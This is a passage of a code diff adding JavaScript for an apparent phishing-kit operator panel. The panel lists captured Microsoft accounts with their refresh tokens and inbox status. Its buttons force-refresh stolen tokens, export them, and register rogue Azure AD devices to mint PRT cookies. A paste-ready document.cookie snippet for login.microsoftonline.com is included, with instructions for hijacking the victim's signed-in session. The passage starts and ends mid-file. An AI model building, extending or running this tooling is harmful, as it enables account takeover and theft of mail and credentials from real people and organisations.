+            no_token:    'no token',
+            unknown:     'failed',
+        }[kind] || 'failed';
+        const cls = kind === 'device_cap' ? 'warn' : 'err';
+        const title = (hint ? hint + '\n\n' : '') + err;
+        return `<span class="chip ${cls}" title="${escapeHtml(title)}">${label}</span>`;
+    }
+
+    return '<span class="chip mute" title="No DRS enrollment attempt recorded">never</span>';
+}
+
+function renderInboxBadge(row) {
+    const state = row.inbox_state;
+    if (state === 'unread') {
+        return `<span class="chip info">${row.inbox_count || 0} unread</span>`;
+    }
+    if (state === 'read') return '<span class="chip mute">read</span>';
+    if (state === 'replied') return '<span class="chip ok">replied</span>';
+    return '<span class="chip mute" title="Inbox feature not yet available">—</span>';
+}
+
+function renderCaBadge(row) {
+    const cls = String(row.ca_class || 'none').toLowerCase();
+
+    if (cls === 'device_bound') {
+        return '<span class="chip ca-danger" title="Token is bound to the host it was minted on (xms_idstd). Will likely be rejected from any other machine.">device-bound</span>';
+    }
+    if (cls === 'fragile') {
+        return '<span class="chip ca-warn" title="Tenant enforces Conditional Access on this account. Token may be invalidated by policy changes or CAE.">CA fragile</span>';
+    }
+    return '<span class="chip mute" title="No Conditional Access signal detected during capture">clean</span>';
+}
+
+/* ---------- Country ---------- */
+
+// ISO-3166 alpha-2 → regional indicator pair.
+// "US" → 🇺🇸
+function countryToFlag(code) {
+    if (!code || typeof code !== 'string' || code.length !== 2) return '';
+    const upper = code.toUpperCase();
+    if (!/^[A-Z]{2}$/.test(upper)) return '';
+    const A = 0x1F1E6;
+    const base = 'A'.charCodeAt(0);
+    return String.fromCodePoint(
+        A + (upper.charCodeAt(0) - base),
+        A + (upper.charCodeAt(1) - base),
+    );
+}
+
+function renderCountryBadge(row) {
+    const code = String(row.country_code || '').trim().toUpperCase();
+    if (!code) {
+        return '<span class="chip mute" title="No country signal available">—</span>';
+    }
+    const flag = countryToFlag(code);
+    const source = row.country_source || 'unknown';
+    const signals = row.country_signals || {};
+    const tooltipBits = [`source: ${source}`];
+    for (const [k, v] of Object.entries(signals)) {
+        const label = k === 'server_ip' ? 'server ip' : k;
+        tooltipBits.push(`${label}: ${v}`);
+    }
+    const tooltip = tooltipBits.join(' · ');
+
+    const distinct = new Set(
+        Object.entries(signals)
+            .filter(([k]) => k !== 'tenant_region' && k !== 'tenant_region_mapped' && k !== 'server_ip')
+            .map(([, v]) => String(v).toUpperCase())
+    );
+    const ambiguous = distinct.size > 1;
+    const cls = ambiguous ? 'chip warn' : 'chip ok';
+
+    return `<span class="${cls} is-plain" title="${escapeHtml(tooltip)}">
+        <span style="font-size: 14px; line-height: 1;">${flag}</span>
+        <span style="font-family: var(--font-mono); font-size: 10.5px; margin-left: 4px;">${escapeHtml(code)}</span>
+    </span>`;
+}
+
+/* ============================================================
+   STATE
+   ============================================================ */
+const vaultState = {
+    offset: 0,
+    limit: 50,
+    total: 0,
+    rows: [],
+};
+
+/* Debounce timer for the search box (kept OUTSIDE vaultState
+   so loadVault(true) resetting offset doesn't touch it). */
+let _searchDebounce = null;
+
+function debouncedLoad() {
+    if (_searchDebounce) clearTimeout(_searchDebounce);
+    _searchDebounce = setTimeout(() => {
+        _searchDebounce = null;
+        loadVault(true);
+    }, 300);
+}
+
+/* ============================================================
+   SEARCH BUSY INDICATOR
+   ============================================================ */
+function setSearchBusy(isBusy) {
+    const field = document.getElementById('vaultSearchField');
+    if (!field) return;
+    field.classList.toggle('is-busy', !!isBusy);
+}
+
+/* ============================================================
+   LOAD
+   ============================================================ */
+async function loadVault(reset = false) {
+    if (reset) vaultState.offset = 0;
+
+    const searchEl = document.getElementById('vaultSearch');
+    const statusEl = document.getElementById('vaultStatusFilter');
+    const drsEl    = document.getElementById('vaultDrsFilter');
+    const orderEl  = document.getElementById('vaultOrder');
+
+    const search = (searchEl?.value || '').trim();
+    const status = (statusEl?.value || '').trim();
+    const drsState = (drsEl?.value || '').trim();
+    const order  = (orderEl?.value || 'captured_at').trim();
+
+    const summary = document.getElementById('vaultSummary');
+    const tbody = document.getElementById('vaultTableBody');
+    const filterChip = document.getElementById('filterSummary');
+
+    // Silent refresh = background auto-refresh, don't blank the table.
+    const isSilentRefresh = !reset && vaultState.rows.length > 0;
+
+    // In-flight search spinner (only for user-initiated searches).
+    if (search && !isSilentRefresh) setSearchBusy(true);
+
+    if (!isSilentRefresh) {
+        if (summary) {
+            summary.textContent = search
+                ? `Searching: "${search}"…`
+                : 'Loading…';
+        }
+        if (tbody) {
+            const msg = search ? `Searching: "${escapeHtml(search)}"…` : 'Loading…';
+            tbody.innerHTML = `<tr><td colspan="10" class="empty-state">${msg}</td></tr>`;
+        }
+    }
+
+    if (filterChip) {
+        const bits = [];
+        if (status) bits.push(`status=${status}`);
+        if (drsState) bits.push(`drs=${drsState}`);
+        if (search) bits.push(`q="${search}"`);
+        filterChip.textContent = bits.length ? `Filter: ${bits.join(' · ')}` : 'All results';
+    }
+
+    try {
+        const params = new URLSearchParams({
+            limit: String(vaultState.limit),
+            offset: String(vaultState.offset),
+            order,
+        });
+        if (search) params.set('search', search);
+        if (status) params.set('status', status);
+        if (drsState) params.set('drs_state', drsState);
+
+        const resp = await fetch(`/api/vault/list?${params.toString()}`, {
+            headers: { Accept: 'application/json' }
+        });
+        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+        const data = await resp.json();
+
+        vaultState.rows = data.results || [];
+        vaultState.total = data.total || 0;
+
+        if (summary) {
+            if (vaultState.total) {
+                summary.textContent = search
+                    ? `${vaultState.total} result(s) for "${search}"`
+                    : `${vaultState.total} result(s)`;
+            } else {
+                summary.textContent = search
+                    ? `No results for "${search}"`
+                    : 'No results';
+            }
+        }
+
+        renderTable(vaultState.rows);
+        updatePagination();
+        updateMetrics();
+    } catch (e) {
+        console.error('Vault load failed:', e);
+        if (summary) summary.textContent = 'Load failed';
+        if (tbody) {
+            tbody.innerHTML =
+                `<tr><td colspan="10" class="empty-state">Error: ${escapeHtml(e.message)}</td></tr>`;
+        }
+    } finally {
+        setSearchBusy(false);
+    }
+}
+
+/* ============================================================
+   METRICS
+   ============================================================ */
+function updateMetrics() {
+    const rows = vaultState.rows || [];
+
+    const active = rows.filter(r => r.status_badge === 'active').length;
+    const expiring = rows.filter(r => {
+        const s = Number(r.token_seconds_until_expiry);
+        return Number.isFinite(s) && s > 0 && s < 3600;
+    }).length;
+
+    const totalEl = document.getElementById('mVaultTotal');
+    const shownEl = document.getElementById('mVaultShown');
+    const activeEl = document.getElementById('mVaultActive');
+    const expEl = document.getElementById('mVaultExpiring');
+    const shownSub = document.getElementById('mVaultShownSub');
+
+    if (totalEl) totalEl.textContent = fmtInt(vaultState.total);
+    if (shownEl) shownEl.textContent = fmtInt(rows.length);
+    if (activeEl) activeEl.textContent = fmtInt(active);
+    if (expEl) expEl.textContent = fmtInt(expiring);
+
+    if (shownSub) {
+        const start = vaultState.offset + (rows.length ? 1 : 0);
+        const end = vaultState.offset + rows.length;
+        shownSub.textContent = rows.length
+            ? `rows ${start}–${end}`
+            : 'no rows on this page';
+    }
+}
+
+/* ============================================================
+   RENDER
+   ============================================================ */
+function renderTable(rows) {
+    const tbody = document.getElementById('vaultTableBody');
+    if (!tbody) return;
+
+    if (!rows || !rows.length) {
+        const searchVal = (document.getElementById('vaultSearch')?.value || '').trim();
+        tbody.innerHTML = searchVal
+            ? `<tr><td colspan="10" class="empty-state">No results matching "${escapeHtml(searchVal)}"</td></tr>`
+            : '<tr><td colspan="10" class="empty-state">No results found</td></tr>';
+        return;
+    }
+
+    const usable = rows.filter(r => {
+        const email = String(r.email || '').trim().toLowerCase();
+        return email && email.includes('@') && email !== 'null' && email !== 'undefined';
+    });
+
+    if (!usable.length) {
+        tbody.innerHTML = '<tr><td colspan="10" class="empty-state">No actionable rows — missing valid email</td></tr>';
+        return;
+    }
+
+    tbody.innerHTML = usable.map((r, idx) => {
+        const email = String(r.email || '').trim();
+        const emailAttr = escapeHtml(email);
+        const emailSafe = escapeHtml(email);
+
+        const name = String(r.display_name || '').trim() || '—';
+        const jobTitle = String(r.job_title || '').trim();
+        const mgrHealth = String(r.manager_health || '').toLowerCase();
+        const canRetry =
+            mgrHealth !== 'revoked' && (
+                r.manager_abandoned === true ||
+                mgrHealth === 'reauth_required' ||
+                (r.has_refresh_token && r.manager_known !== true)
+            );
+        return `
+            <tr data-idx="${idx}" data-email="${emailAttr}">
+                <td class="email" data-label="Email">${emailSafe}</td>
+                <td data-label="Country">${renderCountryBadge(r)}</td>
+                <td data-label="CA">${renderCaBadge(r)}</td>
+                <td data-label="Name">
+                    <div class="name-cell">
+                        <span class="name-primary">${escapeHtml(name)}</span>
+                        ${jobTitle ? `<span class="name-secondary">${escapeHtml(jobTitle)}</span>` : ''}
+                    </div>
+                </td>
+                <td data-label="Token life">${renderTokenLife(r)}</td>
+                <td data-label="Status">${renderStatusBadge(r)}</td>
+                <td data-label="DRS">${renderDrsBadge(r)}</td>
+                <td data-label="Inbox">${renderInboxBadge(r)}</td>
+                <td data-label="Captured" style="color: var(--text-dim); font-size: 11px; white-space: nowrap; font-family: var(--font-mono);">${escapeHtml(fmtDate(r.captured_at))}</td>
+                <td class="actions" data-label="Actions">
+                    <div class="row-actions">
+                        <button class="btn btn-xs" data-action="view"   data-email="${emailAttr}">View</button>
+                        <button class="btn btn-xs btn-primary" data-action="mint" data-email="${emailAttr}">Mint</button>
+                        ${canRetry ? `<button class="btn btn-xs" data-action="refresh" data-email="${emailAttr}" title="Retry refresh on the next manager cycle">Retry</button>` : ''}
+                        <button class="btn btn-xs" data-action="renew" data-email="${emailAttr}" title="Force-refresh this token now">Refresh</button>
+                        <button class="btn btn-xs" data-action="export" data-email="${emailAttr}">Export</button>
+                        <button class="btn btn-xs btn-danger" data-action="delete" data-email="${emailAttr}">Delete</button>
+                    </div>
+                </td>
+            </tr>
+        `;
+    }).join('');
+}
+
+function updatePagination() {
+    const pg = document.getElementById('vaultPagination');
+    const prev = document.getElementById('vaultPrevBtn');
+    const next = document.getElementById('vaultNextBtn');
+
+    const shown = vaultState.rows.length;
+    const start = vaultState.offset + (shown ? 1 : 0);
+    const end = vaultState.offset + shown;
+    const total = vaultState.total;
+
+    if (pg) pg.textContent = total ? `Showing ${start}–${end} of ${total}` : 'No results';
+    if (prev) prev.disabled = vaultState.offset === 0;
+    if (next) next.disabled = end >= total;
+}
+
+function vaultPage(delta) {
+    const newOffset = vaultState.offset + delta * vaultState.limit;
+    if (newOffset < 0) return;
+    if (delta > 0 && newOffset >= vaultState.total) return;
+    vaultState.offset = newOffset;
+    loadVault(false);
+}
+
+/* ============================================================
+   ROW ACTIONS
+   ============================================================ */
+document.addEventListener('click', function (event) {
+    const button = event.target.closest('#vaultTableBody button[data-action]');
+    if (!button) return;
+
+    event.preventDefault();
+    event.stopPropagation();
+
+    const email = String(button.dataset.email || '').trim();
+    const action = button.dataset.action;
+
+    if (!isValidEmail(email)) {
+        showStatus('Invalid email for this row', 'error');
+        return;
+    }
+
+    if (action === 'view') viewRow(email);
+    else if (action === 'mint') mintCookie(email, button);
+    else if (action === 'refresh') retryRefresh(email, button);
+    else if (action === 'renew') refreshTokenNow(email, button);
+    else if (action === 'export') exportRow(email, button);
+    else if (action === 'delete') deleteRow(email, button);
+});
+
+async function refreshTokenNow(email, btn) {
+    const original = btn ? btn.textContent : '';
+    if (btn) { btn.disabled = true; btn.textContent = 'Refreshing…'; }
+    try {
+        const resp = await fetch(`/api/refresh-manager/refresh/${encodeURIComponent(email)}`, {
+            method: 'POST',
+            headers: { Accept: 'application/json' },
+        });
+        const data = await resp.json().catch(() => ({}));
+        if (data.success) {
+            const secs = data.seconds_until_expiry;
+            const extra = secs ? ` (${Math.floor(secs / 60)}m remaining)` : '';
+            showStatus(`Token refreshed for ${email}${extra}`, 'success');
+            await loadVault(true);
+        } else {
+            const code = data.error_code ? ` [${data.error_code}]` : '';
+            const desc = data.error_description ? ` — ${data.error_description.slice(0, 100)}` : '';
+            showStatus(`Refresh failed for ${email}${code}${desc}`, 'error');
+        }
+    } catch (e) {
+        showStatus(`Refresh request failed: ${e.message}`, 'error');
+    } finally {
+        if (btn) { btn.disabled = false; btn.textContent = original || 'Refresh'; }
+    }
+}
+
+async function retryRefresh(email, button) {
+    button.disabled = true;
+    try {
+        const response = await fetch(`/api/refresh-manager/retry/${encodeURIComponent(email)}`, {
+            method: 'POST',
+            headers: { Accept: 'application/json' },
+        });
+        const payload = await response.json().catch(() => ({}));
+        if (!response.ok) throw new Error(payload.error || `HTTP ${response.status}`);
+        showStatus(`Refresh retry queued for ${email}`, 'success');
+        await loadVault(true);
+    } catch (e) {
+        showStatus(`Refresh retry failed: ${e.message}`, 'error');
+    } finally {
+        button.disabled = false;
+    }
+}
+
+function isValidEmail(value) {
+    const email = String(value || '').trim().toLowerCase();
+    if (!email) return false;
+    if (email === 'email' || email === 'undefined' || email === 'null') return false;
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+/* ---------- View ---------- */
+function viewRow(email) {
+    const url = `/api/results/${encodeURIComponent(email)}/detail`;
+    fetch(url, { headers: { Accept: 'application/json' } })
+        .then(r => r.json().then(j => ({ ok: r.ok, status: r.status, body: j })))
+        .then(({ ok, status, body }) => {
+            if (!ok) {
+                showStatus(`View failed: HTTP ${status}`, 'error');
+                return;
+            }
+            const win = window.open('', '_blank');
+            if (!win) {
+                showStatus('Popup blocked — allow popups to view details', 'warning');
+                return;
+            }
+            const safe = escapeHtml(JSON.stringify(body, null, 2));
+            win.document.write(`
+                <!DOCTYPE html><html><head><title>${escapeHtml(email)}</title>
+                <style>
+                    body { background:#080b12; color:#dfe6f2; font-family:'SF Mono','JetBrains Mono',Consolas,monospace; font-size:12px; padding:16px; white-space:pre-wrap; word-break:break-all; }
+                    h1 { font-size:11px; color:#e03a4a; margin-bottom:12px; font-weight:700; letter-spacing:0.12em; text-transform:uppercase; border-bottom:1px solid #1e2736; padding-bottom:10px; }
+                </style></head><body><h1>${escapeHtml(email)}</h1>${safe}</body></html>
+            `);
+            win.document.close();
+        })
+        .catch(e => showStatus('View error: ' + e.message, 'error'));
+}
+
+/* ---------- Mint ---------- */
+async function mintCookie(email, btn) {
+    // ── Single-flight guard ─────────────────────────────────────────────
+    // Reject a second Mint click for the same email while the first is
+    // still in flight. renderTable() replaces the button DOM node during
+    // background auto-refreshes, resetting `disabled` to false — so the
+    // button attribute alone can't prevent a double-click during a 20s
+    // re-enroll. Without this, two concurrent re-enrolls spawn two
+    // enrollment.py processes, each registering a device in Azure AD and
+    // consuming two tenant device slots. Backend has a matching lock in
+    // drs_re_enroll as a second layer of defense.
+    const _key = String(email || '').trim().toLowerCase();
+    if (_inFlightMint.has(_key)) {
+        showStatus(`Mint already in progress for ${email}`, 'info');
+        return;
+    }
+    _inFlightMint.add(_key);
+
+    const original = btn ? btn.textContent : '';
+    if (btn) { btn.disabled = true; btn.textContent = 'Minting…'; }
+
+    try {
+        const resp = await fetch(
+            `/api/drs/mint-cookie/${encodeURIComponent(email)}`,
+            { method: 'POST', headers: { Accept: 'application/json' } }
+        );
+        const data = await resp.json().catch(() => ({}));
+
+        if (resp.ok && data.success) {
+            showCookieModal({
+                email: data.email,
+                cookie: data.cookie,
+                snippet: data.snippet || null,
+                expiresIn: data.expires_in_seconds || 300,
+                enrollmentId: data.enrollment_id,
+                regenerated: data.regenerated_prt === true,
+                regenerationReason: data.regeneration_reason || null,
+            });
+            return;
+        }
+
+        // Missing enrollment (no row, or artifacts gone) → auto re-enroll
+        // and retry. No confirm dialog: the operator already clicked Mint,
+        // which is the intent. Covers both:
+        //   - no_enrollment: imported token, never enrolled
+        //   - artifacts_missing: enrolled but cert/key/transport gone
+        const needsEnroll =
+            data &&
+            (data.failure_kind === 'artifacts_missing' ||
+             data.failure_kind === 'no_enrollment');
+
+        if (needsEnroll) {
+            if (data.token_present === false) {
+                showStatus(
+                    `Cannot enroll ${email}: no stored token. Import a token or re-capture first.`,
+                    'error'
+                );
+                return;
+            }
+
+            if (btn) btn.textContent = 'Re-enrolling…';
+            showStatus(
+                `Regenerating enrollment for ${email}… this may take up to a minute`,
+                'info'
+            );
+
+            const reEnrolled = await reEnrollTarget(email, btn);
+            if (!reEnrolled) {
+                return;
+            }
+
+            // Retry the mint now that cert.pem is on disk.
+            if (btn) btn.textContent = 'Minting…';
+            showStatus('Enrollment regenerated. Minting cookie…', 'info');
+
+            const retryResp = await fetch(
+                `/api/drs/mint-cookie/${encodeURIComponent(email)}`,
+                { method: 'POST', headers: { Accept: 'application/json' } }
+            );
+            const retryData = await retryResp.json().catch(() => ({}));
+
+            if (retryResp.ok && retryData.success) {
+                showStatus(`Cookie minted for ${email}`, 'success');
+                showCookieModal({
+                    email: retryData.email,
+                    cookie: retryData.cookie,
+                    snippet: retryData.snippet || null,
+                    expiresIn: retryData.expires_in_seconds || 300,
+                    enrollmentId: retryData.enrollment_id,
+                    regenerated: retryData.regenerated_prt === true,
+                    regenerationReason: retryData.regeneration_reason || null,
+                });
+                return;
+            }
+
+            // After re-enroll, a 409 policy-skip is still possible if the
+            // first re-enroll attempt failed permanently. Show the modal.
+            if (retryResp.status === 409 && retryData.skipped_retry) {
+                showMintFailureModal({
+                    email,
+                    kind: retryData.failure_kind || 'policy',
+                    error: retryData.error || '(no error text)',
+                    hint: retryData.hint || '',
+                });
+                return;
+            }
+
+            const retryErr = retryData.error || `HTTP ${retryResp.status}`;
+            const retryHint = retryData.hint ? ` — ${retryData.hint}` : '';
+            showStatus(
+                `Mint failed after re-enroll: ${retryErr}${retryHint}`,
+                'error'
+            );
+            return;
+        }
+
+        // 409 from the DRS pre-flight: this target is a known permanent
+        // failure. Show a persistent dialog so the operator can read the
+        // real error instead of a 3.6s toast.
+        if (resp.status === 409 && data.skipped_retry) {
+            showMintFailureModal({
+                email,
+                kind: data.failure_kind || 'policy',
+                error: data.error || '(no error text)',
+                hint: data.hint || '',
+            });
+            return;
+        }
+
+        const msg = data.error || `HTTP ${resp.status}`;
+        const hint = data.hint ? ` — ${data.hint}` : '';
+        showStatus(`Mint failed: ${msg}${hint}`, 'error');
+    } catch (e) {
+        showStatus(`Mint request failed: ${e.message}`, 'error');
+    } finally {
+        _inFlightMint.delete(_key);
+        if (btn) { btn.disabled = false; btn.textContent = original || 'Mint'; }
+    }
+}
+
+async function reEnrollTarget(email, btn) {
+    try {
+        const resp = await fetch(
+            `/api/drs/re-enroll/${encodeURIComponent(email)}`,
+            { method: 'POST', headers: { Accept: 'application/json' } }
+        );
+        const data = await resp.json().catch(() => ({}));
+
+        if (resp.ok && data.success && data.artifacts_ok) {
+            const secs = data.duration_ms
+                ? ` (${(data.duration_ms / 1000).toFixed(1)}s)`
+                : '';
+            showStatus(`Enrollment regenerated for ${email}${secs}`, 'success');
+            return true;
+        }
+
+        // Defensive for future API changes; the current backend only returns
+        // success when artifacts_ok is true.
+        if (resp.ok && data.success && data.artifacts_ok === false) {
+            showStatus(
+                `Re-enroll returned success but artifacts are still ` +
+                `missing for ${email}`,
+                'warning'
+            );
+            return false;
+        }
+
+        // 409 policy-skip path from drs_re_enroll.
+        if (resp.status === 409 && data.skipped_retry) {
+            showMintFailureModal({
+                email,
+                kind: data.failure_kind || 'policy',
+                error: data.error || '(no error text)',
+                hint: data.hint || '',
+            });
+            return false;
+        }
+
+        if (data.failure_kind === 'auth') {
+            showStatus(
+                `Re-enroll failed for ${email}: DRS rejected the token. ` +
+                `This token is probably mail-scoped, not DRS-scoped. ` +
+                `Re-capture with DRS scope, or use a token that carries scp=adrs_access.`,
+                'error'
+            );
+        } else if (data.failure_kind === 'no_token') {
+            showStatus(
+                `Cannot enroll ${email}: no stored refresh token. Import or re-capture first.`,
+                'error'
+            );
+        } else if (data.failure_kind === 'schema' || (data.failure_kind || '').startsWith('schema/')) {
+            showStatus(
+                `Re-enroll failed for ${email}: DRS rejected the enrollment envelope ` +
+                `(${data.failure_kind}). See console for the raw DRS response.`,
+                'error'
+            );
+        } else {
+            const err =
+                data.failure_message ||
+                data.error ||
+                (data.stderr_tail && data.stderr_tail.trim().split('\n').pop()) ||
+                `HTTP ${resp.status}`;
+            showStatus(`Re-enroll failed for ${email}: ${err}`, 'error');
+        }
+
+        if (data.stdout_tail || data.stderr_tail) {
+            console.groupCollapsed(`[re-enroll ${email}] pipeline output`);
+            if (data.stdout_tail) console.log('stdout:\n' + data.stdout_tail);
+            if (data.stderr_tail) console.warn('stderr:\n' + data.stderr_tail);
+            console.groupEnd();
+        }
+        return false;
+    } catch (e) {
+        showStatus(`Re-enroll request failed: ${e.message}`, 'error');
+        return false;
+    }
+}
+
+/* ---------- Mint failure modal (persistent 409 report) ---------- */
+function showMintFailureModal({ email, kind, error, hint }) {
+    const existing = document.getElementById('mintFailureOverlay');
+    if (existing) existing.remove();
+
+    const labelMap = {
+        policy:      'Tenant policy block',
+        device_cap:  'Device cap reached',
+        assignment:  'User not assigned',
+        consent:     'Consent required',
+        app_missing: 'DRS app missing',
+        schema:      'Schema rejection',
+        token:       'Token scope problem',
+        no_token:    'No usable token',
+        unknown:     'DRS rejected enrollment',
+    };
+    const heading = labelMap[kind] || 'DRS rejected enrollment';
+
+    const overlay = document.createElement('div');
+    overlay.id = 'mintFailureOverlay';
+    overlay.style.cssText = `
+        position: fixed; inset: 0; background: rgba(0,0,0,0.78);
+        z-index: 9999; display: flex; align-items: center; justify-content: center;
+        padding: 16px; backdrop-filter: blur(4px);`;
+
+    const box = document.createElement('div');
+    box.style.cssText = `
+        background: var(--bg-panel); border: 1px solid var(--line);
+        width: 100%; max-width: 680px; max-height: 90vh; overflow-y: auto;
+        color: var(--text); font-family: var(--font-sans);
+        box-shadow: 0 24px 64px rgba(0,0,0,0.6);`;
+
+    box.innerHTML = `
+        <div style="display:flex; align-items:center; justify-content:space-between;
+                    padding: 14px 18px; border-bottom: 1px solid var(--line);
+                    background: var(--bg-elev);">
+            <div style="display:flex; align-items:center; gap:10px;">
+                <span style="width:3px; height:14px; background: var(--danger);"></span>
+                <span style="font-size:11px; letter-spacing:0.14em; text-transform:uppercase;
+                             color:var(--text); font-family:var(--font-mono); font-weight:700;">${escapeHtml(heading)}</span>
+            </div>
+            <button class="mfm-close" type="button" aria-label="Close"
+                    style="background:none; border:none; color:var(--text-dim); font-size:20px;
+                           cursor:pointer; padding:2px 8px; font-family:var(--font-mono);">&times;</button>
+        </div>
+
+        <div style="padding: 18px;">
+            <div style="font-family:var(--font-mono); font-size:12px; color:var(--text-dim);
+                        margin-bottom:14px; word-break:break-all;">${escapeHtml(email)}</div>
+
+            ${hint ? `
+            <div style="margin-bottom:14px; padding:10px 12px;
+                        background: rgba(255,165,2,0.06);
+                        border:1px solid rgba(255,165,2,0.35); border-left-width:3px;
+                        color:var(--warning); font-size:12px; font-family:var(--font-mono);
+                        line-height:1.5;">${escapeHtml(hint)}</div>` : ''}
+
+            <label style="display:block; font-size:9.5px; letter-spacing:0.12em;
+                          text-transform:uppercase; color:var(--text-faint);
+                          margin-bottom:6px; font-family:var(--font-mono); font-weight:600;">Raw error</label>
+            <textarea readonly class="mfm-error" rows="6"
+                style="width:100%; padding:12px; background: var(--bg-input); color: var(--text-dim);
+                       border: 1px solid var(--line); font-family: var(--font-mono);
+                       font-size: 11px; line-height: 1.6; resize: vertical; outline: none;"></textarea>
+
+            <p style="margin: 12px 0 0; font-size: 11px; color: var(--text-faint);
+                      font-family: var(--font-mono); line-height: 1.6;">
+                This failure is now recorded on the target row. Clicking Mint again
+                on the same target will return this same error without re-running
+                the pipeline — remove or skip the target to stop seeing it.
+            </p>
+        </div>
+
+        <div style="display:flex; align-items:center; justify-content:flex-end; gap:8px;
+                    padding: 14px 18px; border-top: 1px solid var(--line);
+                    background: var(--bg-elev);">
+            <button class="btn btn-xs mfm-close">Close</button>
+            <button class="btn btn-xs btn-primary mfm-copy">Copy error</button>
+        </div>
+    `;
+
+    const ta = box.querySelector('.mfm-error');
+    ta.value = error || '(no error text)';
+
+    const close = () => overlay.remove();
+    box.querySelectorAll('.mfm-close').forEach(b => b.onclick = close);
+    overlay.addEventListener('click', ev => { if (ev.target === overlay) close(); });
+    box.querySelector('.mfm-copy').onclick = async (ev) => {
+        const btn = ev.currentTarget;
+        try {
+            await navigator.clipboard.writeText(ta.value);
+            btn.textContent = 'Copied';
+            setTimeout(() => { btn.textContent = 'Copy error'; }, 1500);
+        } catch {
+            ta.select();
+            document.execCommand('copy');
+        }
+    };
+
+    overlay.appendChild(box);
+    document.body.appendChild(overlay);
+}
+
+/* ---------- Cookie modal ---------- */
+function showCookieModal(opts) {
+    const { email, cookie, snippet, expiresIn, enrollmentId, regenerated, regenerationReason } = opts;
+
+    const existing = document.getElementById('cookieMintOverlay');
+    if (existing) existing.remove();
+
+    const fallbackSnippet =
+        `document.cookie="x-ms-RefreshTokenCredential=${cookie}; ` +
+        `path=/; domain=.login.microsoftonline.com; secure; samesite=none";`;
+    const effectiveSnippet = (typeof snippet === 'string' && snippet.length)
+        ? snippet
+        : fallbackSnippet;
+
+    const overlay = document.createElement('div');
+    overlay.id = 'cookieMintOverlay';
+    overlay.style.cssText = `
+        position: fixed; inset: 0;
+        background: rgba(0,0,0,0.78);
+        z-index: 9999;
+        display: flex; align-items: center; justify-content: center;
+        padding: 16px;
+        backdrop-filter: blur(4px);
+    `;
+
+    const box = document.createElement('div');
+    box.style.cssText = `
+        background: var(--bg-panel);
+        border: 1px solid var(--line);
+        width: 100%;
+        max-width: 900px;
+        max-height: 92vh;
+        overflow-y: auto;
+        color: var(--text);
+        font-family: var(--font-sans);
+        box-shadow: 0 24px 64px rgba(0,0,0,0.6);
+    `;
+
+    const regenNote = regenerated
+        ? `<div style="margin: 0 0 14px; padding: 10px 12px; background: rgba(255,165,2,0.06);
+                       border: 1px solid rgba(255,165,2,0.35); border-left-width: 3px;
+                       color: var(--warning); font-size: 11px; font-family: var(--font-mono);
+                       letter-spacing: 0.04em; text-transform: uppercase;">
+               PRT regenerated · ${escapeHtml(regenerationReason || 'reason not given')}
+           </div>`
+        : '';
+
+    box.innerHTML = `
+        <div style="display:flex; align-items:center; justify-content:space-between;
+                    gap:12px; padding: 14px 18px; border-bottom: 1px solid var(--line); background: var(--bg-elev);">
+            <div style="display:flex; align-items:center; gap:10px; min-width:0;">
+                <span style="width:3px; height:14px; background: var(--accent); display:inline-block;"></span>
+                <span style="font-size:11px; letter-spacing:0.14em; text-transform:uppercase; color:var(--text); font-family:var(--font-mono); font-weight:700;">PRT cookie</span>
+                <span style="font-family:var(--font-mono); font-size:12px; color:var(--text-dim);
+                             white-space:nowrap; overflow:hidden; text-overflow:ellipsis; margin-left:6px;">${escapeHtml(email)}</span>
+            </div>
+            <button class="close-btn" type="button" aria-label="Close"
+                    style="background:none; border:none; color:var(--text-dim); font-size:20px; cursor:pointer; line-height:1; padding:2px 8px; font-family:var(--font-mono);">&times;</button>
+        </div>
+
+        <div style="padding: 18px;">
+            ${regenNote}
+
+            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+                        gap: 1px; background: var(--line); border: 1px solid var(--line); margin-bottom: 18px; font-size: 11.5px;">
+                <div style="background: var(--bg-input); padding: 12px 14px;">
+                    <div style="font-size:9.5px; letter-spacing:0.12em; text-transform:uppercase; color:var(--text-faint); margin-bottom:4px; font-family:var(--font-mono); font-weight:600;">Enrollment</div>
+                    <div style="font-family:var(--font-mono); color:var(--text); word-break:break-all; font-size:11px;">${escapeHtml(enrollmentId || '—')}</div>
+                </div>
+                <div style="background: var(--bg-input); padding: 12px 14px;">
+                    <div style="font-size:9.5px; letter-spacing:0.12em; text-transform:uppercase; color:var(--text-faint); margin-bottom:4px; font-family:var(--font-mono); font-weight:600;">Cookie name</div>
+                    <div style="font-family:var(--font-mono); color:var(--text); font-size:11px;">x-ms-RefreshTokenCredential</div>
+                </div>
+                <div style="background: var(--bg-input); padding: 12px 14px;">
+                    <div style="font-size:9.5px; letter-spacing:0.12em; text-transform:uppercase; color:var(--text-faint); margin-bottom:4px; font-family:var(--font-mono); font-weight:600;">Domain</div>
+                    <div style="font-family:var(--font-mono); color:var(--text); font-size:11px;">.login.microsoftonline.com</div>
+                </div>
+                <div style="background: var(--bg-input); padding: 12px 14px;">
+                    <div style="font-size:9.5px; letter-spacing:0.12em; text-transform:uppercase; color:var(--text-faint); margin-bottom:4px; font-family:var(--font-mono); font-weight:600;">Valid for</div>
+                    <div style="font-family:var(--font-mono); color:var(--success); font-size:11px;">
+                        <span class="ttl">${expiresIn}</span> seconds
+                    </div>
+                </div>
+            </div>
+
+            <label style="display:block; font-size:9.5px; letter-spacing:0.12em; text-transform:uppercase;
+                          color:var(--text-faint); margin-bottom:6px; font-family:var(--font-mono); font-weight:600;">Paste-ready snippet</label>
+            <textarea readonly class="snippet-value" rows="1"
+                style="width:100%; height:auto; min-height:420px; padding:14px;
+                       background: var(--bg-input); color: var(--text-dim);
+                       border: 1px solid var(--line);
+                       font-family: var(--font-mono); font-size: 11px; line-height: 1.6;
+                       white-space: pre-wrap; word-break: break-all; overflow-wrap: anywhere;
+                       overflow: hidden; resize: none; outline: none; display: block;"></textarea>
+            <p style="margin: 10px 0 0; font-size: 11px; color: var(--text-faint); font-family: var(--font-mono); line-height: 1.6;">
+                Paste into the browser devtools console on any
+                <code style="font-family:var(--font-mono); color:var(--text-dim);">login.microsoftonline.com</code> page.
+                The iframe authenticates silently and the browser lands on the target page signed in.
+            </p>
+
+            <label style="display:block; margin-top: 20px; font-size:9.5px; letter-spacing:0.12em;
+                          text-transform:uppercase; color:var(--text-faint); margin-bottom:6px; font-family:var(--font-mono); font-weight:600;">Raw cookie value</label>
+            <textarea readonly class="cookie-value" rows="1"
